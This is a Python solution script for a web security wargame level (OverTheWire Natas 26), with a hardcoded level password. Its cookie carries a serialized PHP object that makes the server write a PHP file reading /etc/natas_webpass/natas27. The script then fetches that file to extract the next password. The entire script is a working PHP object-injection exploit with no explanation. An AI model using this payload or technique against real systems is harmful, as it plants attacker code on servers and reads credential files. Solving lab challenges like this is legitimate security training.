import re, requests
USER = 'natas26'
PASS = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'
URL = f'http://{USER}.natas.labs.overthewire.org/?x1=11&y1=22&x2=33&y2=44'
AUTH_BASIC = requests.auth.HTTPBasicAuth(USER, PASS)
BURP = {"http": "http://127.0.0.1:8080"}

get = requests.get(url=URL, auth=AUTH_BASIC)
get_cookie = str(get.cookies.copy)
regex_for_sid = re.search('([0-9a-z]{26})', get_cookie)
sid = regex_for_sid[0]
cookies_drwaing = {
    "PHPSESSID": sid,
    "drawing": "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL2pvYW8ucGhwIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDk6Ijw/cGhwIHJlYWRmaWxlKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOz8+Ly8iO30="
}
request = requests.get(url=URL, auth=AUTH_BASIC, cookies=cookies_drwaing, proxies=BURP)
phpsessid = {'PHPSESSID': sid}
url = f'http://{USER}.natas.labs.overthewire.org/img/joao.php'
get_flag = requests.get(url=url, auth=AUTH_BASIC, proxies=BURP, cookies=phpsessid)
print('the password for the natas27 is:',re.search('([0-9a-zA-Z]{32})', get_flag.text)[0])